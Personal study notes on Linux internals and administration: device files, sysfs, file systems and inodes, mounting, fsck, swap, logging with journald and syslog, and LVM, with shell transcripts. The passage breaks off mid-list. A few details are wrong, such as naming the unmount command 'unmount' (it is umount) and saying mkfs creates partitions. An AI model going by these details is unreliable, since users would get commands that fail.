<pre><code class="language-sh">ryan:notes/  |main ‚úì|$ ls -l /dev | head
total 0
crw-------   1 root root       10,   107 Jan  6 15:14 acpi_thermal_rel
crw-r--r--   1 root root       10,   235 Jan  6 15:14 autofs
drwxr-xr-x   2 root root             260 Jan  6 15:14 block/
crw-rw----   1 root disk       10,   234 Jan  6 15:14 btrfs-control
drwxr-xr-x   3 root root              60 Jan  6 15:14 bus/
drwxr-xr-x   2 root root            5960 Jan  7 08:29 char/
crw--w----   1 root tty         5,     1 Jan  6 15:14 console
lrwxrwxrwx   1 root root              11 Jan  6 15:14 core -&gt; /proc/kcore
drwxr-xr-x  10 root root             220 Jan  6 15:14 cpu/
</code></pre>
</li>
</ul>
</li>
</ul>
<h2 id="device-types"><a class="header" href="#device-types">device types</a></h2>
<ul>
<li>block device = hard disks. Data is read in chunks</li>
<li>character device = data is read in streams (monitors, printers, etc.)</li>
<li>pipes = like character devices, except another process is at the end of the IO stream</li>
<li>socket = special purpose interfaces that are typically used for inter-process communications</li>
</ul>
<h2 id="sysfs"><a class="header" href="#sysfs">sysfs</a></h2>
<ul>
<li>The sysfs filesystem is a pseudo-filesystem which provides an interface to kernel data structures.</li>
<li>The sysfs filesystem is commonly mounted at /sys.</li>
<li>Many of the files in the sysfs filesystem are read-only, but some files are writable, allowing kernel variables to be changed. To avoid redundancy, symbolic links are heavily used to connect entries across the filesystem tree.</li>
</ul>
<pre><code class="language-sh">ryan:~/ $ ll /sys/
total 4
   1 0 dr-xr-xr-x  13 root root    0 Jan  6 15:14 ./
   2 4 drwxr-xr-x  20 root root 4096 Dec 27 19:39 ../
8359 0 drwxr-xr-x   2 root root    0 Jan  6 15:14 block/
   8 0 drwxr-xr-x  54 root root    0 Jan  6 15:14 bus/
  10 0 drwxr-xr-x  87 root root    0 Jan  6 15:14 class/
   5 0 drwxr-xr-x   4 root root    0 Jan  6 15:14 dev/
   4 0 drwxr-xr-x  29 root root    0 Jan  6 15:14 devices/
  11 0 drwxr-xr-x   6 root root    0 Jan  6 15:14 firmware/
   2 0 drwxr-xr-x  10 root root    0 Jan  6 15:14 fs/
  12 0 drwxr-xr-x   2 root root    0 Jan  6 15:14 hypervisor/
5235 0 drwxr-xr-x  17 root root    0 Jan  6 15:14 kernel/
6394 0 drwxr-xr-x 349 root root    0 Jan  6 15:14 module/
5247 0 drwxr-xr-x   3 root root    0 Jan  6 15:14 power/

</code></pre>
<ul>
<li>The most important directories within <code>/sys</code> are:
<ul>
<li>block = contains info for every block device attached to the system</li>
<li>bus = contains a directory for every bus type in the kernel</li>
<li>hypervisor =</li>
<li>class</li>
<li>devices</li>
<li>kernel</li>
<li>firmware</li>
<li>module</li>
<li>power</li>
</ul>
</li>
</ul>
<p>https://docs.kernel.org/filesystems/sysfs.html
https://www.kernel.org/doc/Documentation/filesystems/sysfs.txt</p>
<h1 id="hard-disks"><a class="header" href="#hard-disks">Hard Disks</a></h1>
<ul>
<li>
<p>Most block devices attached to a Linux system will have a device name with a prefix of /dev/sd*</p>
<ul>
<li>Example: /dev/sda</li>
<li>The ‚Äòsd‚Äô portion stands for SCSI Disk</li>
</ul>
</li>
<li>
<p>To list the SCSI devices on your system, use a tool that walks the SCSI device paths, such as <code>lsscsi</code></p>
<ul>
<li><code>lsscsi</code> is not commonly installed by default</li>
</ul>
</li>
</ul>
<h1 id="udevd"><a class="header" href="#udevd">udevd</a></h1>
<ul>
<li>udevd is responsible for creating device files for attached devices</li>
<li>The process is commonly <code>systemd-udevd</code></li>
<li>The kernel will send a notification to this process upon detecting a new device attached to the system. Udevd will then create a file in user-land for the device.
<ul>
<li>This caused problems because some devices need to be available very early in the boot process, so devtmpfs was created</li>
<li>devtmpfs filesytem is used by the kernel to create device files as necessary, but it also notifies udevd that a new device is available. Upon receiving this signal, udevd does not create a new device file, but it does perform device initialization along with setting permissions and notifying other processes that new devices are available.</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="disks"><a class="header" href="#disks">Disks</a></h1>
<ul>
<li>Modern disks include an on-disk queue for I/O requests. I/O accepted by the disk may either be waiting on the queue or served. While this may imply a first-come, first-served queue, the on-disk controller can apply other algorithms to optimize performance. These algorithms include elevator seeking for rotational disks or separate queues for read and write I/O (especially for flash disks).</li>
</ul>
<h3 id="caching"><a class="header" href="#caching">Caching</a></h3>
<p>The on-disk cache may also be used to increase write performance, by using it as a write-back cache. This signals writes as having completed after the data transfer to cache and before the slower transfer to persistent storage. The counter-term is the write-through cache, which completes writes only after the full transfer to the next level. Storage write-back caches are often coupled with batteries, in case of power failure.</p>
<p>The best caching is no caching at all.</p>
<p>At the disk device driver level and below, caches may include the following:</p>
<ul>
<li>Device Cache</li>
<li>Block Cache</li>
<li>Disk Controller Cache</li>
<li>Storage Array Cache</li>
<li>On-disk Cache</li>
</ul>
<h3 id="measuring-time"><a class="header" href="#measuring-time">Measuring Time</a></h3>
<p>Storage time can be measured as:</p>
<ul>
<li>I/O request time: the entire time from issuing I/O to it‚Äôs completion</li>
<li>I/O Wait time: The time spent waiting in a queue</li>
<li>I/O service time: The time during which the I/O was processing</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="file-systems"><a class="header" href="#file-systems">file systems</a></h1>
<ul>
<li>A file system is like a database. It defines the structure to transform a simple block device into a sophisticated heirarchy of files and directories that users can understand.</li>
<li>File Systems are typically implemented in the Kernel. However, 9P from Plan 9 has inspired the development of user-space file systems. The FUSE (File System in User Space) feature allows file systems to be created in user-space.</li>
<li>The following list shows the most common file systems in use today:
<ul>
<li>ext4 (extended file system, v4)
<ul>
<li>Supports journaling (a small cache outside of the file system) to provide data integrity and hasten booting (introduced with ext3)</li>
<li>The ext4 file system is an incremental improvement over ext2/3 and provides support for larger files and a greater number of directories.</li>
</ul>
</li>
<li>btrfs (b-tree filesystem)
<ul>
<li>a newer file system native to linux, designed to scale beyond the limitations of ext4</li>
</ul>
</li>
<li>FAT (file allocation table)
<ul>
<li>3 types: msdos, vfat, exfat</li>
<li>Used by most removable flash media</li>
<li>Supported by Windows, Darwin, and Linux</li>
</ul>
</li>
<li>XFS
<ul>
<li>A high performance filesystem used by default on some Linux distros, such as RHEL</li>
</ul>
</li>
<li>HFS+
<ul>
<li>An Apple standard filesystem used on Mac systems</li>
</ul>
</li>
<li>ISO 9660
<ul>
<li>Used on CD-ROM discs</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="directories"><a class="header" href="#directories">Directories</a></h4>
<ul>
<li>Directories in Linux (ext file systems) are just a file with a table. The table has 2 columns. The two columns contain the name and the inode of the files within the directory.</li>
</ul>
<h4 id="inodes"><a class="header" href="#inodes">inodes</a></h4>
<ul>
<li>A traditional *nix file system has two primary components: a pool of data blocks where you can store data and a database system that manages that data pool. The database system is centered around the inode data structure. An inode is metadata about a file. Inodes are identified by numbers in an inode table. File names and directories are implemented as inodes.</li>
<li>A directory inode contains a list of filenames and links correspending to other inodes.</li>
<li>To view the inode numbers for any directory, use <code>ls -i</code> or <code>stat &lt;filename&gt;</code></li>
<li>3 time stamps:
<ul>
<li>atime: last time the file was open()</li>
<li>mtime: last time the file was modified</li>
<li>ctime: ctime IS NOT creation time. It is the last time the inode was changed. For example, using chown or chmod will change the ctime.</li>
</ul>
</li>
</ul>
<h4 id="format-a-partition-with-a-file-system"><a class="header" href="#format-a-partition-with-a-file-system">Format a partition with a file system</a></h4>
<ul>
<li>When preparing new storage devices, after partitioning the device, you are ready to create a file system
<ul>
<li>You can use <code>mkfs</code> to create partitions. <code>mkfs</code> has several aliases for each partition type. Example: <code>mkfs.ext4</code>, <code>mkfs.xfs</code>, etc.</li>
<li>mkfs will automatically detect blocks on a device and set some reasonable defaults based on this. Unless you really understand what you are doing, do not change these defaults.</li>
</ul>
</li>
</ul>
<h4 id="mounting-a-file-system"><a class="header" href="#mounting-a-file-system">Mounting a file system</a></h4>
<ul>
<li>After creating a file system on a partition, you can mount it using the <code>mount</code> command
<ul>
<li>Usage: <code>mount -t *type* *device* *mountpoint*</code></li>
<li>Example: <code>mount -t ext4 /dev/sda2 /mnt/mydisk</code></li>
<li>To unmount a file system, use <code>unmount</code>
<ul>
<li>Example: <code>unmount /mnt/mydisk</code></li>
</ul>
</li>
<li>It is recommended to mount a file system with it‚Äôs UUID, rather than it‚Äôs name. Device names are determined by the order in which the kernel finds the device and can change over time.
<ul>
<li>You can use <code>blkid</code> or <code>lsblk -f</code> to identify the UUID of a partition</li>
<li>You can then mount using the UUID by:
<ul>
<li><code>mount UUID=&lt;insert UUID here&gt; /mnt/mydisk</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><em>The number of options available for the mount command is staggering. You should review the man page for more info</em></p>
<h4 id="bufferingcachecaching"><a class="header" href="#bufferingcachecaching">Buffering/Cache/Caching</a></h4>
<ul>
<li>Linux, like other Unix variants, buffer writes to the disk. This means that the kernel doesn‚Äôt immediately write changes to the disk. But will instead write the changes to a buffer in RAM and then later write them to the disk when it deems appropriate.</li>
<li>When you unmount a file system with <code>unmount</code>, it‚Äôs changes are automatically written to the disk from the buffer (why is why you should always unmount partitions before removing them from the system, i.e. USB drives). However, you can also force this to happen using the <code>sync</code> command.</li>
<li>The kernel also uses a cache to store reads from the disk. This way, if a process continually reads the same data from the disk, it doesn‚Äôt have to go to the disk every time to fetch the data, rather using the cache to read the data from.</li>
</ul>
<h4 id="automatically-mounting-filesystems-at-boot-time"><a class="header" href="#automatically-mounting-filesystems-at-boot-time">Automatically mounting filesystems at boot time</a></h4>
<ul>
<li>The <code>/etc/fstab</code> file is used to automatically mount filesystems at boot time</li>
<li>There are two alternatives to <code>/etc/fstab</code>
<ul>
<li><code>/etc/fstab.d/</code> directory. This directory can contain individual filesystem configuration files (one for each filesystem).</li>
<li>Systemd unit files.</li>
</ul>
</li>
</ul>
<h4 id="filesystem-utilization"><a class="header" href="#filesystem-utilization">Filesystem Utilization</a></h4>
<ul>
<li>To view the utilization of your currently mounted filesytem, you can use the <code>df</code> command.
<ul>
<li>Pass the <code>-h</code> flag to view free space in a human readable form
<ul>
<li>Example: <code>df -h</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="checking-and-repairing-filesystems"><a class="header" href="#checking-and-repairing-filesystems">Checking and Repairing Filesystems</a></h4>
<ul>
<li>Filesystem errors are usually due to a user shutting down a system in a wrong way (like pulling the power cable). Such situations could leave the filesystem cache in memory not matching the data on the disk. This is especially bad if the system is in the process of modifying the filesystem when you give it a kick. Many filesystems support journaling (ext3+ filesystems for example), but you should always shut down a system properly.</li>
<li>The tool to check a filesystem for errors is <code>fsck</code>. There is a different version of <code>fsck</code> for each filesystem that linux supports. For example, the ext filesystems will use <code>e2fsck</code> to check the filesystem for errors. However, you don‚Äôt need to run <code>e2fsck</code> directly. You can just run <code>fsck</code> and it will usually detect the filesystems and run the appropriate repair tool.</li>
<li>You should <strong>never</strong> run <code>fsck</code> on a mounted filesystem. The kernel may alter data in the filesystem as you run the check, causing runtime mismatches that can crash the system and corrupt files. There is one exception to this rule. If you mount the root partition in read-only, single-user mode, you can run <code>fsck</code> on it.</li>
<li>When <code>fsck</code> asks you about reconnecting an inode, it has found a file that doesn‚Äôt appear to have a name. When reconnecting an inode, <code>fsck</code> will place the file in the lost+found directory with a number as the name. <code>fsck</code> does this by walking through the inode table and directory structure to generate new link counts and a new block allocation map (such as the block bitmap), and then it compares this newly generated data with the filesystem on the disk. If there are mismatches, <code>fsck</code> must fix the link counts and determine what to do with any inodes and/or data that didn‚Äôt come up when it traversed the directory structure.</li>
<li>On a system that has <strong>many</strong> problems, <code>fsck</code> can make things worse. One way to tell if you should cancel the <code>fsck</code> utility is if it asks <strong>a lot</strong> of questions while running the repair process. This is usually indicative of a bigger problem. If you think this is the case, you can run <code>fsck -n</code> to run <code>fsck</code> in dry mode (no changes will be made to the partition).</li>
<li>If you suspect that a superblock is corrupt, perhaps because someone overwrote the beginning of the disk, you might be able to recover the filesystem with one of the superblock backups that <code>mkfs</code> creates. Use <code>fsck -b &lt;num&gt;</code> to replace the corrupted superblock with an alternate at <em>num</em> and hope for the best. If you don‚Äôt know where to find a backup for the superblock, you can run <code>mkfs -n</code> on the device to view a list of superblock backup numbers without destroying your data.</li>
<li>You normally do not need to check ext3/4 filesystems manually because the journal ensures data integrity.</li>
<li>The kernel will not mount an ext3/4 filesystems with a non-empty journal. You can flush the journal using <code>e2fsck -fy /dev/&lt;device&gt;</code></li>
</ul>
<h4 id="special-purpose-filesystems"><a class="header" href="#special-purpose-filesystems">Special purpose filesystems</a></h4>
<ul>
<li>proc - mounted on <code>/proc</code>. Each numbered directory inside <code>/proc</code> refers to the PID of a running process on the system. The directory <code>/proc/self</code> represents the current process.</li>
<li>sysfs - mounted on <code>/sys</code>. See <code>./devices.md</code> for more info.</li>
<li>tmpfs - mounted on <code>/run</code> and other locations. Allows you to use physical memory and swap space as temporary storage.</li>
<li>squashfs - a type of read-only filesystem where content is stored in a compressed format and extracted on-demand through a loopback device.</li>
<li>overlay - a filesystem that merges directories in a composite directory. Often used by containers.</li>
</ul>
<h4 id="swap-space"><a class="header" href="#swap-space">Swap space</a></h4>
<ul>
<li>Swap space is used to augment the RAM on a machine with disk space</li>
<li>If you run out of physical memory, the Linux virtual memory system can move pages of memory to and from disk storage (swap space). This is referred to as paging.</li>
<li>You can use <code>mkswap</code> to create swap space on a partition. Then use <code>swapon</code> to enable it. You can also use <code>swapoff</code> to disable swap space.</li>
<li>In addition to using disk space for swap, you can also use a file. You can first create the file with <code>dd</code>. Example: <code>dd if=/dev/zero of=/swapfile bs=1024k count=&lt;size in megabytes&gt;</code></li>
<li>High performance servers should not have swap space and should avoid disk access if at all possible.</li>
</ul>
<h4 id="prefetch"><a class="header" href="#prefetch">Prefetch</a></h4>
<p>A common file system workload involves reading a large amount of file data sequentially, for example, for a file system backup. This data may be too large to fit in the cache, or it may be read only once, and is therefore unlikely to remain in the cache. Such a workload would perform relatively poorly, as it would have a low cache-hit ratio.</p>
<p>Prefetch is a common file system feature for solving this problem. It can detect a sequential read workload based on the current and previous file I/O offsets, and then predict and issue disk reads before the application has requested them. This populates the file system cache, so that if the application does perform the expected read, it results in a cache-hit, rather than reading from much slower disk.</p>
<p>Prefetch can typically be tuned in most systems.</p>
<h4 id="write-back-caching"><a class="header" href="#write-back-caching">Write-back Caching</a></h4>
<p>Write-back caching is commonly used by file systems to improve write performance. It works by treating writes as completed after the transfer to main memory, and writing them to disk sometime later, asynchronously. The file system process for writing this ‚Äòdirty‚Äô data to disk is called ‚Äòflushing‚Äô. The trade-off of write-back cache is reliability. DRAM-based main memory is volatile, and dirty data can be lost in the event of a power failure. Data could also be written to disk incompletely, leaving the disk in a corrupt state. If file-system metadata becomes corrupted, the file system may no longer load.</p>
<h4 id="synchronous-writes"><a class="header" href="#synchronous-writes">Synchronous writes</a></h4>
<p>Synchronous writes are used by some applications such as database log writers, where the risk of data corruption for asynchronous writes is unacceptable.</p>
<h4 id="vfs-virtual-file-system"><a class="header" href="#vfs-virtual-file-system">VFS (Virtual File System)</a></h4>
<p>VFS provides a common interface for different file system types. Prior to VFS, different file systems required different system calls for interacting with each. The calls for interacting with a FAT file system were different than those for a EXT file system.</p>
<h4 id="file-system-caches"><a class="header" href="#file-system-caches">File System Caches</a></h4>
<p>Unix originally only had the buffer cache to improve performance of block device access. Nowadays, Linux has multiple different cache types.</p>
<ul>
<li>Page Cache</li>
<li>Buffer cache</li>
<li>Directory Cache</li>
<li>inode cache</li>
</ul>
<h4 id="copy-on-write"><a class="header" href="#copy-on-write">Copy on write</a></h4>
<p>A Copy on write (COW) file system does not overwrite existing blocks but instead follows these steps:</p>
<ol>
<li>Write blocks to a new location (a new copy)</li>
<li>Update references to new blocks</li>
<li>Add old blocks to the free list</li>
</ol>
<p>This helps maintain file system integrity in the event of a system failure, and also helps improve performance by turning random writes into sequential ones</p>
<h1 id="troubleshooting-file-systems"><a class="header" href="#troubleshooting-file-systems">Troubleshooting File Systems</a></h1>
<p>Key metrics for file systems include:</p>
<ul>
<li>Operation Rate</li>
<li>Operation latency</li>
</ul>
<p>In Linux, there are typically no readily available metrics for file system operations (the exception being NFS, via <code>nfsstat</code>).</p>
<h3 id="tools-2"><a class="header" href="#tools-2">Tools:</a></h3>
<ul>
<li><code>mount</code></li>
<li><code>free</code></li>
<li><code>top</code></li>
<li><code>vmstat</code></li>
<li><code>sar</code></li>
<li><code>slabtop</code></li>
<li><code>filetop</code></li>
<li><code>cachestat</code></li>
<li><code>fsck</code></li>
<li><code>ext4slower</code></li>
<li><code>e2fsck</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="groups-1"><a class="header" href="#groups-1">Groups</a></h1>
<p>Groups offer a way to share files and directories among users.</p>
<ul>
<li>
<p>The <code>/etc/group</code> file defines the group IDs. Each line in this file represents a group, with fields separated by colons. There are 4 fields:</p>
<ol>
<li>The group name</li>
<li>The group password (this can be ignored)</li>
<li>The group Id</li>
<li>An optional list of users that belong to the group</li>
</ol>
</li>
<li>
<p>To see the groups you belong to, run <code>groups</code></p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="hashing-1"><a class="header" href="#hashing-1">Hashing</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="interrupts-and-traps"><a class="header" href="#interrupts-and-traps">Interrupts and Traps</a></h1>
<ul>
<li>Most operating systems are implemented as interrupt-driven systems. Meaning the OS doesn‚Äôt run until some entity needs it to do something, the OS is woken up to handle a request.</li>
<li>System calls are implemented as special trap instructions that are defined as part of the CPU‚Äôs ISA.</li>
<li>Each system call is associated with a number. When an application wants to invoke a system call, it places the desired call‚Äôs number in a known location and issues a trap instruction to interrupt the OS. The trap triggers the CPU to stop executing its current instruction, and proceed execution the requesting application‚Äôs instruction.</li>
<li>Interrupts that come from the hardware layer, such as when a NIC receives data from the network, are typically referred to as hardware interrupts, or just interrupts. Interrupts that come from the software layer as the result of instruction execution, are known as traps.</li>
<li>Unlike system calls, hardware interrupts are delivered via the CPU‚Äôs interrupt bus. A device place‚Äôs a signal on the interrupt bus when it needs the CPU‚Äôs attention.</li>
<li>When the CPU is done handling an interrupt, it resumes processing it‚Äôs state before the interrupt occurred.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kernel-subsystems"><a class="header" href="#kernel-subsystems">kernel subsystems</a></h1>
<p>Linux kernel has 5 subsystems:</p>
<ol>
<li>The Process Scheduler (SCHED)</li>
<li>The Memory Manager (MM)</li>
<li>The Virtual File System (VFS)</li>
<li>The Networking Interface (NET)</li>
<li>The Inter-process Communication (IPC)</li>
</ol>
<h1 id="kernel-structure-and-subsystem-dependencies"><a class="header" href="#kernel-structure-and-subsystem-dependencies">Kernel structure and subsystem dependencies</a></h1>
<p><img src="images/kernel_depends.png" alt=""></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="key-value-store"><a class="header" href="#key-value-store">Key Value Store</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="hard-and-soft-links"><a class="header" href="#hard-and-soft-links">Hard and Soft Links</a></h1>
<p>Use <code>ln</code> to manage soft and hard links</p>
<h4 id="inodes-1"><a class="header" href="#inodes-1">Inodes</a></h4>
<ul>
<li>An inode is a reference to a file on the disk</li>
<li>The stat command can be used to view inodes</li>
<li>When there are 0 links to an inode, the data itself is erased from the disk</li>
<li>Hard links point to the same inode</li>
</ul>
<h4 id="links"><a class="header" href="#links">Links</a></h4>
<ul>
<li>You can only hardlink to files, not directories</li>
<li>You cannot hardlink to files on a mount, only files on the same filesystem</li>
<li>Soft links create a shortcut directly to the file, rather than a link to the inode</li>
<li><code>readlink</code> can be used to view the file behind a softlink</li>
<li>broken soft links are highlighted in red in the output of <code>ls -l</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="commands-2"><a class="header" href="#commands-2">commands</a></h1>
<p><img src="systems/images/linux/linux_commands.png" alt=""></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="logging"><a class="header" href="#logging">Logging</a></h1>
<h2 id="journald"><a class="header" href="#journald">Journald</a></h2>
<p>Most programs write their log output to the syslog service. The syslogd daemon performs this service on traditional systems by listening for these messages and sending them to the appropriate channel (file, database, email, etc.) when received. On modern systems, journald typically does this work. <code>journalctl</code> can be used to work with journald.</p>
<p>You can determine if your system is using journald by typing <code>journalctl</code> in a shell. If the system is using journald, you will see a paged output. Unless you have a system that is using a traditional syslog daemon such as syslogd or rsyslogd, you will use the journal. To get the full output from <code>journalctl</code>, you need to run the command as root or as a user of the adm or systemd-journal groups.</p>
<ul>
<li>
<p>Some examples of using <code>journalctl</code>:</p>
<ul>
<li>To search for logs from a process using the PID: <code>journalctl _PID=555</code> (where 555 is the PID)</li>
<li>To search for messages from the past 4 hours: <code>journalctl -S -4h</code></li>
<li>To filter by unit: <code>journalctl -u sshd.service</code></li>
<li>To search by a given field: <code>journalctl -F _SYSTEMD_UNIT</code></li>
<li>If you do not know what fields are available, use: <code>journalctl -N</code></li>
<li>To view the logs from <em>this</em> boot: <code>journalctl -b</code></li>
<li>To view the logs from the previous boot: <code>journalctl -b -1</code></li>
<li>To list all boots by ID: <code>journalctl --list-boots</code></li>
<li>To view Kernel messages: <code>journalctl -k</code></li>
<li>To filter by severity level: <code>journalctl -p 3</code> (where 3 is the severity level. Values range from 0 (most important) to 7 (least important))</li>
</ul>
</li>
<li>
<p>Journal maintenance</p>
<ul>
<li>the journal files stored in <code>/var/log/journal</code> do not need to be rotated. journald handles the maintenance of these files.</li>
</ul>
</li>
</ul>
<h2 id="syslogd"><a class="header" href="#syslogd">Syslogd</a></h2>
<p>Syslogd first appeared with the sendmail email server back in the 1980‚Äôs. Developers of other services readily adopted it, and RFC3164 was ratified to define it. The syslog mechanism is simple. It listens on a Unix domain socket, <code>/dev/log</code>. Though, it can also listen on a network socket, enabling any device on the network to send logs to it. This makes rsyslogd act as a log server.</p>
<ul>
<li>Facility, severity, and priority
<ul>
<li>Syslog sends messages of various types from different services to different destinations. Becuase of this, it needs a way to classify each message.</li>
<li>The facility is a general category of service, used to identify the service that sent the message. The available facilities in the syslog protocol are hardwired and there is no way to add your own. However, you can use a general local0 through local7 value.</li>
<li>The severity is the urgency of the log messages. This can be a value from 0 (most urgent) to 7 (least urgent)
<ul>
<li>
<ol start="0">
<li>emerg</li>
</ol>
</li>
<li>
<ol>
<li>alert</li>
</ol>
</li>
<li>
<ol start="2">
<li>crit</li>
</ol>
</li>
<li>
<ol start="3">
<li>err</li>
</ol>
</li>
<li>
<ol start="4">
<li>warn</li>
</ol>
</li>
<li>
<ol start="5">
<li>notice</li>
</ol>
</li>
<li>
<ol start="6">
<li>info</li>
</ol>
</li>
<li>
<ol start="7">
<li>debug</li>
</ol>
</li>
</ul>
</li>
<li>The facility and the severity together make up the priority, packaged as a single value in the syslog protocol. You can read more about this in RFC 5424</li>
<li></li>
<li></li>
</ul>
</li>
</ul>
<h2 id="logfile-rotation"><a class="header" href="#logfile-rotation">Logfile Rotation</a></h2>
<p>When you are using a syslog daemon, log messages get put into files somewhere on the system. These files need to be rotated on a schedule to prevent the files from consuming too much storage space. <code>logrotate</code> performs this task.</p>
<ul>
<li>How <code>logrotate</code> works:
<ol>
<li>Remove the oldest file, auth.log.3</li>
<li>Renames auth.log.2 to auth.log.3</li>
<li>Renames auth.log.1 to auth.log.2</li>
<li>Renames auth.log to auth.log.1</li>
</ol>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lvm-logical-volume-manager"><a class="header" href="#lvm-logical-volume-manager">lvm (logical volume manager)</a></h1>
<ul>
<li>
<p>LVM creates an abstraction layer between physical storage and the file system, allowing the file system to be resized and span across multiple disks</p>
</li>
<li>
<p>Physical volumes are grouped into groups of volumes, called Volume Groups. These Volume Groups are then divided into Logical Volumes</p>
</li>
<li>
<p>LVM Acronyms</p>
<ul>
<li>
<p>PV = Physical Volume, real physical storage devices</p>
<ul>
<li><code>sudo lvmdiskscan</code> can be used to list devices that may be used as physical volumes
<pre><code>04:52:03 azureadmin@centos01 ~ ‚Üí sudo lvmdiskscan
/dev/sda1  [     500.00 MiB]
/dev/sda2  [      29.02 GiB]
/dev/sda15 [     495.00 MiB]
/dev/sdb1  [     &lt;64.00 GiB]
/dev/sdf   [       5.00 GiB]
/dev/sdh   [       5.00 GiB]
/dev/sdi   [       5.00 GiB]
3 disks
4 partitions
0 LVM physical volume whole disks
0 LVM physical volumes
</code></pre>
</li>
<li><code>'sudo pvcreate /dev/sdc /dev/sdd /dev/sde</code> can be used to create a new LVM volume from 3 disks
<pre><code>04:52:06 azureadmin@centos01 ~ ‚Üí sudo pvcreate /dev/sdf /dev/sdh /dev/sdi
Physical volume "/dev/sdf" successfully created.
Physical volume "/dev/sdh" successfully created.
Physical volume "/dev/sdi" successfully created.
</code></pre>
</li>
<li><code>sudo pvs</code> can be used to list physical volumes used by LVM
<pre><code>04:52:19 azureadmin@centos01 ~ ‚Üí sudo pvs
PV         VG Fmt  Attr PSize PFree
/dev/sdf      lvm2 ---  5.00g 5.00g
/dev/sdh      lvm2 ---  5.00g 5.00g
/dev/sdi      lvm2 ---  5.00g 5.00g
</code></pre>
</li>
</ul>
</li>
<li>
<p>VG = Volume Group</p>
<ul>
<li>After LVM has physical devices (pvs), you add the pvs to a volume group (vg). This tells LVM how it can use the storage capacity</li>
<li><code>sudo vgcreate my_volume /dev/sdf /dev/sdh</code> will create a new VG with 2 PV
<pre><code>04:58:13 azureadmin@centos01 ~ ‚Üí sudo vgcreate my_vol /dev/sdf /dev/sdh
Volume group "my_vol" successfully created
</code></pre>
</li>
<li>Once disks are added to a volume group, they are seen by the system as one contiguous block of storage</li>
<li>You can add another disk to the volume group using <code>vgextend</code>
<pre><code>05:00:06 azureadmin@centos01 ~ ‚Üí sudo vgextend my_vol /dev/sdi
Volume group "my_vol" successfully extended
</code></pre>
</li>
<li>use <code>sudo vgs</code> to view the status of Volume Groups:
<pre><code>05:00:14 azureadmin@centos01 ~ ‚Üí sudo vgs
VG     #PV #LV #SN Attr   VSize   VFree
my_vol   3   0   0 wz--n- &lt;14.99g &lt;14.99g
</code></pre>
</li>
<li>use <code>sudo vgreduce my_vol /dev/sdi</code> to remove a physical volume from a volume group
<pre><code>05:00:39 azureadmin@centos01 ~ ‚Üí sudo vgreduce my_vol /dev/sdi
Removed "/dev/sdi" from volume group "my_vol"
</code></pre>
</li>
</ul>
</li>
<li>
<p>LV = Logical Volume</p>
<ul>
<li>A logical volume is similar to a partition</li>
<li><code>sudo lvcreate --size 2G --name partition1 my_vol</code> can be used to create a logical volume of 2 gigabytes
<pre><code>05:02:22 azureadmin@centos01 ~ ‚Üí sudo lvcreate --size 2G --name partition1 my_vol
Logical volume "partition1" created.
</code></pre>
</li>
<li>You can view logical volumes using <code>sudo lvs</code>
<pre><code>05:03:49 azureadmin@centos01 ~ ‚Üí sudo lvs
LV         VG     Attr       LSize Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
partition1 my_vol -wi-a----- 2.00g
partition2 my_vol -wi-a----- 6.00g
</code></pre>
</li>
<li>to tell a logical volume to use all space on a logical volume, use <code>sudo lvresize</code>
<pre><code>05:03:50 azureadmin@centos01 ~ ‚Üí sudo lvresize --extents 100%VG my_vol/partition1
Reducing 100%VG to remaining free space 3.99 GiB in VG.
Size of logical volume my_vol/partition1 changed from 2.00 GiB (512 extents) to 3.99 GiB (1022 extents).
Logical volume my_vol/partition1 successfully resized.
</code></pre>
</li>
<li>the path to LVs on the system can be found using <code>lvdisplay</code>
<pre><code>05:08:32 azureadmin@centos01 ~ ‚Üí sudo lvdisplay  | grep "LV Path"
LV Path                /dev/my_vol/partition1
LV Path                /dev/my_vol/partition2
</code></pre>
</li>
<li>You can then add a file system to a LV using common file system management commands
<pre><code>05:08:41 azureadmin@centos01 ~ ‚Üí sudo mkfs.xfs /dev/my_vol/partition1
meta-data=/dev/my_vol/partition1 isize=512    agcount=4, agsize=261632 blks
        =                       sectsz=4096  attr=2, projid32bit=1
        =                       crc=1        finobt=1, sparse=1, rmapbt=0
        =                       reflink=1
data     =                       bsize=4096   blocks=1046528, imaxpct=25
        =                       sunit=0      swidth=0 blks
naming   =version 2              bsize=4096   ascii-ci=0, ftype=1
log      =internal log           bsize=4096   blocks=2560, version=2
        =                       sectsz=4096  sunit=1 blks, lazy-count=1
realtime =none                   extsz=4096   blocks=0, rtextents=0
Discarding blocks...Done.
</code></pre>
</li>
<li>If the LV contains a file system, you must take extra caution when resizing it. You must pass the <code>--resizefs</code> parameter to <code>lvresize</code></li>
<li><code>sudo lvresize --resizefs --size 3G my_vol\partition1</code></li>
<li>XFS file system shrinking is not supported</li>
</ul>
</li>
</ul>
</li>
<li>
<p>If you forget what commands to use for LVM, simply open the man pages for LVM and scroll to the bottom to get a list of available commands</p>
<ul>
<li><code>man lvm</code></li>
</ul>
</li>
<li>
<p><code>sudo lvmdiskscan</code> will show what disks are available</p>
</li>
<li>
<p>To create a physical volume:</p>
<ul>
<li><code>sudo pvcreate /dev/sdd /dev/sde /dev/sdf</code></li>
<li>Example:
<pre><code>[azureadmin@centos01 shares]$ sudo pvcreate /dev/sdd /dev/sde
Physical volume "/dev/sdd" successfully created.
Physical volume "/dev/sde" successfully created.
</code></pre>
</li>
<li>To list physical volumes: <code>sudo pvs</code>
<pre><code>[azureadmin@centos01 shares]$ sudo pvs
PV         VG Fmt  Attr PSize PFree
/dev/sdd      lvm2 ---  5.00g 5.00g
/dev/sde      lvm2 ---  5.00g 5.00g
</code></pre>
</li>
<li>After creating the physical volume, add it to a volume group:
<ul>
